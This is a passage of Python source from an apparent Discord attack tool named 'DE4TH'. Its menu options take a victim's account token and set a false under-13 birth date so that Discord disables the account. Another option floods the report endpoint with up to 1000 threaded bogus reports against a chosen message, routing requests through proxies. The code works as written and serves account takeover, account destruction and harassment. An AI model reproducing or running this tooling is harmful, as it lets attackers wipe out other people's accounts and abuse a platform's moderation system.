                        elif m == "You cannot update your date of birth.":
                            slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Account can\'t be disabled')
                        else:
                            slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Unknown Response: {m}')
                    elif death.status_code == 404:
                        print(ERROR_PREFIX + "Invalid token")
                    else:
                        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Failed to disable account')
                print(f"\n\n{F.LIGHTRED_EX}  [!] {a} JUST GOT NUKED! [!]{F.RESET}\n")
            else:
                print(ERROR_PREFIX + "Invalid Token")

    elif choice == 12:
        os.system('cls && title DE4TH ^| Account Disabler')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        death = requests.patch('https://discordapp.com/api/v9/users/@me', proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}, json={'date_of_birth': '2014-02-11'})
        if death.status_code == 400:
            m = death.json()['errors']['date_of_birth']['_errors'][0]['message']
            if m == "You need to be 13 or older in order to use Discord.":
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Successfully disabled the account!')
            elif m == "You cannot update your date of birth.":
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Account can\'t be disabled')
            else:
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Unknown Response: {m}')
        elif death.status_code == 404:
            print(ERROR_PREFIX + "Invalid token")
        else:
            slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Failed to disable account')
    elif choice == 13:
        os.system('cls && title DE4TH ^| Mass Report')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token (This token will send reports) {F.RESET}> {F.LIGHTGREEN_EX}')
        guild_id = input(f' {F.GREEN}Guild ID {F.RESET}> {F.LIGHTGREEN_EX}')
        channel_id = input(f' {F.GREEN}Channel ID {F.RESET}> {F.LIGHTGREEN_EX}')
        message_id = input(f' {F.GREEN}Message ID {F.RESET}> {F.LIGHTGREEN_EX}')
        print(f'''\n{F.RESET}          >>  {F.LIGHTBLACK_EX}    --    {F.CYAN + 'Choose Report Reason' + F.LIGHTBLACK_EX}    --      {F.RESET}<<
{F.RESET} >  {F.LIGHTCYAN_EX} 1 {F.RESET} : {F.LIGHTGREEN_EX}Illegal Content
{F.RESET} >  {F.LIGHTCYAN_EX} 2 {F.RESET} : {F.LIGHTGREEN_EX}Harassment
{F.RESET} >  {F.LIGHTCYAN_EX} 3 {F.RESET} : {F.LIGHTGREEN_EX}Spam or Phishing Links
{F.RESET} >  {F.LIGHTCYAN_EX} 4 {F.RESET} : {F.LIGHTGREEN_EX}Self-Harm
{F.RESET} >  {F.LIGHTCYAN_EX} 5 {F.RESET} : {F.LIGHTGREEN_EX}NSFW Content''')
        try:
            reason = int(input(f' {F.GREEN}Enter your Choice (1-5) {F.RESET}> {F.LIGHTGREEN_EX}'))
            if not reason in [1,2,3,4,5]:
                print(ERROR_PREFIX + "Please only type a number within 1, 2, 3, 4, 5!")
            else:
                def report(token, guild_id, channel_id, message_id, reason):
                    Responses = {
                        '401: Unauthorized': f'Invalid Discord token.',
                        'Missing Access': f'Missing access to channel or guild.',
                        'You need to verify your account in order to perform this action.': f'Unverified Account.'
                    }

                    report = requests.post(
                        'https://discordapp.com/api/v8/report', json = {
                            'channel_id': channel_id,
                            'message_id': message_id,
                            'guild_id': guild_id,
                            'reason': reason
                        }, headers = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate',
                            'accept-language': 'sv_SE',
                            'user-agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                            'content-type': 'application/json',
                            'authorization': token
                        }
                    )

                    if (status := report.status_code) == 201:
                        print(f"{F.RESET} > {F.LIGHTCYAN_EX}Sent Report! {F.RESET}: {F.LIGHTGREEN_EX}Success!"+F.RESET)
                    elif status in (401, 403):
                        print(ERROR_PREFIX + '' + Responses[report.json()['message']] + '\n')
                    elif status == 429:
                        print(f"  {F.LIGHTYELLOW_EX}Rate Limited {F.RESET}: {F.LIGHTBLACK_EX}Retrying in {report.json()['retry-after']} seconds")
                        time.sleep(int(report.json()['retry-after']))
                    else:
                        print(ERROR_PREFIX + report.text + f' | {status}')
                amount = int(input(f' {F.GREEN}Amount of reports {F.RESET}> {F.LIGHTGREEN_EX}'))
                if amount < 1:
                    amount =1
                elif amount > 1000:
                    amount = 1000
                threa = []
                for i in range(amount):
                    t = threading.Thread(target=report, args=(token, guild_id, channel_id, message_id, reason - 1))
                    t.start()
                    threa.append(t)
                for i in range(amount):
                    threa[i].join()
                time.sleep(1)
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Successfully sent {amount} reports!')
        except Exception as e:
            print(ERROR_PREFIX + "Please only type a number: "+e)
    elif choice == 14:
        exit()

main()
input(centure(F.LIGHTBLACK_EX + 'Press enter to restart program!' + F.RESET))
main()
